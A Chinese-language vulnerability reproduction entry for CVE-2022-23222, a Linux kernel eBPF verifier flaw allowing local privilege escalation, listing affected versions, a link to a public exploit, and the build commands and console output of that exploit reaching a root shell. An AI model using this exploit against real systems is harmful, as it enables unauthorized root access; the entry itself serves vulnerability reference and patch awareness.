# Linux eBPF 权限提升漏洞 CVE-2022-23222

## 漏洞描述

Linux Kernel 是美国 Linux 基金会发布的开源操作系统 Linux 所使用的内核。Linux 内核是一种开源的类Unix 操作系统宏内核。整个 Linux 操作系统家族基于该内核部署在传统计算机平台（如个人计算机和服务器）。该漏洞是由于 Linux 内核的 BPF 验证器存在一个空指针漏洞，没有对 *_OR_NULL 指针类型进行限制，允许这些类型进行指针运算。攻击者可利用该漏洞在获得低权限的情况下，构造恶意数据执行空指针引用攻击，最终获取服务器 root 权限

## 漏洞影响

```
Linux 5.8 - 5.16（在5.10.92 / 5.15.15 / 5.16.1中修复）
```

## 漏洞复现

Exp：https://github.com/tr3ee/CVE-2022-23222

```
$ make
cc -I include -static -w -o exploit exploit.c
$ ./exploit 
[*] phase(1/8) 'create bpf map(s)' running
[+] phase(1/8) 'create bpf map(s)' done
[*] phase(2/8) 'do some leak' running
[+] phase(2/8) 'do some leak' done
[*] phase(3/8) 'prepare arbitrary rw' running
[+] phase(3/8) 'prepare arbitrary rw' done
[*] phase(4/8) 'spawn processes' running
[+] phase(4/8) 'spawn processes' done
[*] phase(5/8) 'find cred (slow)' running
[+] phase(5/8) 'find cred (slow)' done
[*] phase(6/8) 'overwrite cred' running
[+] phase(6/8) 'overwrite cred' done
[*] phase(7/8) 'spawn root shell' running
[+] Enjoy root!
# id
uid=0(root) gid=0(root) groups=65534(nobody)
# exit
[+] phase(7/8) 'spawn root shell' done
[*] phase(8/8) 'clean up the mess' running
[+] phase(8/8) 'clean up the mess' done
```
